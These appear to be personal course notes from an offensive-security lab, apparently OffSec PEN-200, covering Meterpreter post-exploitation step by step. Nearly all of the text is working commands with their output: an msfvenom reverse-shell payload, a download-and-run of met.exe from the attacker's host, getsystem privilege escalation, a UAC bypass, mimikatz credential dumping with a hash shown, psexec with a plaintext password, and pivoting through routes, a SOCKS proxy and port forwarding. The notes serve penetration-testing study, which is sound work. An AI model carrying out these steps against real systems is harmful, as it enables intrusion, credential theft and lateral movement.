### Core Meterpreter Post-Exploitation Features 

Create a Windows executable with a Meterpreter reverse shell payload

`msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.4 LPORT=443 -f exe -o met.exe`

Launch multi/handler and set payload 

```
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_https
payload => windows/x64/meterpreter_reverse_https
```

Set listening port 

 ```
msf6 exploit(multi/handler) > set LPORT 443
```

Run 
```
msf6 exploit(multi/handler) > run
[*] Exploit running as background job 2.
[*] Exploit completed, but no session was created.

[*] Started HTTPS reverse handler on https://192.168.119.4:443
```

Start #pythonhttpserver to serve `met.exe`

Connect to target with nc 

```
kali@kali:~$ nc 192.168.50.223 4444
Microsoft Windows [Version 10.0.22000.795]
(c) Microsoft Corporation. All rights reserved.
```

Download and execute payload on target 

```hlt:1,8,11
C:\Users\dave> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\dave> iwr -uri http://192.168.119.2/met.exe -Outfile met.exe
iwr -uri http://192.168.119.2/met.exe -Outfile met.exe

PS C:\Users\dave> .\met.exe
.\met.exe
```

After `met.exe` execution, receive reverse shell

```
[*] Meterpreter session 8 opened (192.168.119.4:443 -> 127.0.0.1) at 2022-08-04 06:41:29 -0400
meterpreter > 
```

#### Post Exploitation Commands 

##### idletime - time user has been idle
```
meterpreter > idletime
User has been idle for: 9 mins 53 secs
```

Metasploit has `getsystem` command that will leverage _SeImpersonatePrivilege_[1](https://portal.offsec.com/courses/pen-200-44065/learning/the-metasploit-framework-45720/performing-post-exploitation-with-metasploit-45768/core-meterpreter-post-exploitation-features-45727#fn-local_id_21-1) and _SeDebugPrivilege_ for privesc. 

Manually checking our user's privvies

Interactive shell
```
meterpreter > shell
```
Check privvies
```hlt:1,9
C:\Users\luiza> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
...
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
...
```

User has _SeImpersonatePrivilege_

##### getsystem - priv esc
```hlt:1
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
```

##### migrate - change process payload is executing from
_Note: Can only migrate into processes at same or lower integrity and privilege level_
View running processes on target 
```
meterpreter > ps

Process List
============

 PID   PPID  Name                         Arch  Session  User                          Path
 ---   ----  ----                         ----  -------  ----                          ----
 2552   8500  met.exe                      x64   0        ITWK01\luiza                  C:\Users\luiza\met.exe 
... 
 8052   4892  OneDrive.exe                 x64   1        ITWK01\offsec                 C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe
```

Migrating to OnDrive.exe process
```hlt:1
meterpreter > migrate 8052
[*] Migrating from 2552 to 8052...
[*] Migration completed successfully.

meterpreter > ps


Process List
============

 PID   PPID  Name                         Arch  Session  User                Path
 ---   ----  ----                         ----  -------  ----                ----
...
 2440   668   svchost.exe
 2472   668   svchost.exe
 2496   668   svchost.exe
 2568   668   svchost.exe
 2624   668   spoolsv.exe
 2660   668   svchost.exe
 2784   668   svchost.exe
 2928   668   svchost.exe
```

This process migration will also switch our userid if PID is owned by another user.

Command execution as user offsec instead of NT AUTHORITY\SYSTEM

```
meterpreter > getuid
Server username: ITWK01\offsec
```

If no processes to migrate to...use execute command

#### execute - create new process
Start hidden notepad process 
```
meterpreter > execute -H -f notepad
Process 2720 created.
```

Migrate to new process
```
meterpreter > migrate 2720
[*] Migrating from 8052 to 2720...
[*] Migration completed successfully.

meterpreter > 
```

### Post-Exploitation Modules
#### Bypassing UAC

##### Setup
Connect to bind shell on target, download and execute met.exe, and priv esc

```
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
```

Migrate to OneDrive process of offsec user

```
meterpreter > migrate 8044
[*] Migrating from 9020 to 8044...
[*] Migration completed successfully.

meterpreter > getuid
Server username: ITWK01\offsec
```

UAC preventing administrative actions. 

Confirming current process has the _Medium_ integrity level

Spawn shell
```
meterpreter > shell
Process 6436 created.
```

EP bypass
```
C:\Windows\system32> powershell -ep bypass
powershell -ep bypass
```

Import _NTObjectManager_
```
PS C:\Windows\system32> Import-Module NtObjectManager
Import-Module NtObjectManager
```

Use _Get-NtTokenIntegrityLevel_ to display integrity level of current process
```hlt:3
PS C:\Windows\system32> Get-NtTokenIntegrityLevel
Get-NtTokenIntegrityLevel
Medium
```

Background active channel and session

```
PS C:\Windows\system32> ^Z
Background channel 1? [y/N]  y

meterpreter > bg
[*] Backgrounding session 9...
```

Search for UAC bypass modules

```
msf6 exploit(multi/handler) > search UAC
```

Effective UAC bypass on modern systems _exploit/windows/local/bypassuac_sdclt_

Select this mod

```
msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_sdclt
```

Disp opts

```hlt:6
Module options (exploit/windows/local/bypassuac_sdclt):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   PAYLOAD_NAME                   no        The filename to use for the payload binary (%RAND% by default).
   SESSION                        yes       The session to run this module on
```

Can set session number to currently active session

```
msf6 exploit(windows/local/bypassuac_sdclt) > set SESSION 9
```

Set LHOST and execute. 

New meterpreter session created

Spawn shell
```
meterpreter > shell
```

EP Bypass
```
C:\Windows\system32> powershell -ep bypass
```

Check integrity of this session (it's HIGH = success)
```hlt:5
PS C:\Windows\system32> Import-Module NtObjectManager
Import-Module NtObjectManager
PS C:\Windows\system32> Get-NtTokenIntegrityLevel
Get-NtTokenIntegrityLevel
High
```

#### Loading Kiwi (mimikatz)
Need to have NT/AUTHORITY SYSYEM shell.

```
meterpreter > load kiwi
```

Use help menu to list commands 
```hlt:11
meterpreter > help
...
Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via 
```

Execute `creds_msv` to retrieve NTLM & LM hashes

```hlt:1
meterpreter > creds_msv
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============
Username  Domain  NTLM                              SHA1
--------  ------  ----                              ----
luiza     ITWK01  167cf9218719a1209efcfb4bce486a18  2f92bb5c2a2526a630122ea1b642c46193a0d837
```

### Pivoting with Metasploit
#### Setup
Connect to bindshell on target
Identify second net interface on target - `172.16.5.199`

```
C:\Users\luiza> ipconfig
```

Execute `met.exe` again on target to get a meterpreter session

BG shell session

Add the extra interface
```
msf6 exploit(multi/handler) > route add 172.16.5.0/24 12
[*] Route added
```

Confirm addition
```
msf6 exploit(multi/handler) > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.16.5.0         255.255.255.0      Session 12
```

#### Enumerate subnet for active hosts
`RHOSTS`-`172.16.5.0/24 for entire subnet
`RHOSTS - 172.16.5.200 for live host`
`PORTS - 445, 3389`

Module
```
msf6 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp 
```

Configs
```
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.5.200
RHOSTS => 172.16.5.200
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
PORTS => 445 (SMB) , 3389 (RDP)
```

Run
```
msf6 auxiliary(scanner/portscan/tcp) > run
[+] 172.16.5.200:         - 172.16.5.200:445 - TCP OPEN
[+] 172.16.5.200:         - 172.16.5.200:3389 - TCP OPEN
[*] 172.16.5.200:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### PSExec to second interface
##### Metasploit Module: windows/x64/meterpreter/bind_tcp

PSExec as Luiza (local admin on target) with pass `BoccieDearAeroMeow1!` to `172.16.5.200`

```hlt:1,4,7,10,13,16
msf6 auxiliary(scanner/portscan/tcp) > use exploit/windows/smb/psexec 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/psexec) > set SMBUser luiza
SMBUser => luiza

msf6 exploit(windows/smb/psexec) > set SMBPass "BoccieDearAeroMeow1!"
SMBPass => BoccieDearAeroMeow1!

msf6 exploit(windows/smb/psexec) > set RHOSTS 172.16.5.200
RHOSTS => 172.16.5.200

msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp

msf6 exploit(windows/smb/psexec) > set LPORT 8000
LPORT => 8000
```

Run [psexec module](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) and get new meterpreter session.

#### Auto Add New Routes 
##### Metasploit Module: multi/manage/autoroute

Remove manually set route with `route flush`

Terminate psexec session.

Use session created by executing `met.exe` as luiza

Select module 
```
msf6 exploit(windows/smb/psexec) > use multi/manage/autoroute
```

Show opts
```
msf6 post(multi/manage/autoroute) > show options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, default)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION                   yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)
```

View active sessions
```
msf6 post(multi/manage/autoroute) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information            Connection
  --  ----  ----                     -----------            ----------
  12         meterpreter x64/windows  ITWK01\luiza @ ITWK01  192.168.119.4:443 -> 127.0.0.1 ()
```

Set active session
```
msf6 post(multi/manage/autoroute) > set session 12
```

Run
```hlt:7,8
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: windows
[*] Running module against ITWK01
[*] Searching for subnets to autoroute.
[+] Route added to subnet 172.16.5.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 192.168.50.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
```

#### Combine Routes with SOCKS Proxy 
Allows apps outside of MSF to tunnel through 1080
##### Metasploit Module: auxiliary/server/socks_proxy

Select mod and disp opts
```
msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy 

msf6 auxiliary(server/socks_proxy) > show options

Module options (auxiliary/server/socks_proxy):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)

Auxiliary action:
   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server
```

Set SRVHOST to 127.0.0.1 and VERSION to 5 for SOCKSv5

```
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
```

```
msf6 auxiliary(server/socks_proxy) > set VERSION 5
```

Execute in the background 
```
msf6 auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background job 0.
[*] Starting the SOCKS proxy server
```

Update #proxychains config file 

```hlt:4
kali@kali:~$ tail /etc/proxychains4.conf
#       proxy types: http, socks4, socks5, raw
[ProxyList]
socks5 127.0.0.1 1080
```

Use #proxychains and #xfreerdp to connect to target 

```
kali@kali:~$ sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza
```

Successful connection to second target via RDP pivoting.

#### Port forwarding 
##### Metasploit Command: portfwd

Display options for portfwd
```hlt:1
meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]

OPTIONS:

    -h   Help banner.
    -i   Index of the port forward entry to interact with (see the "list" command).
    -l   Forward: local port to listen on. Reverse: local port to connect to.
    -L   Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p   Forward: remote port to connect to. Reverse: remote port to listen on.
    -r   Forward: remote host to connect to.
    -R   Indicates a reverse port forward.
```

Port forward from localhost:3389 to 172.16.5.200:3389

```
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.5.200
```

Confirm successful portfwd with #xfreerdp 

```
kali@kali:~$ sudo xfreerdp /v:127.0.0.1 /u:luiza             
```

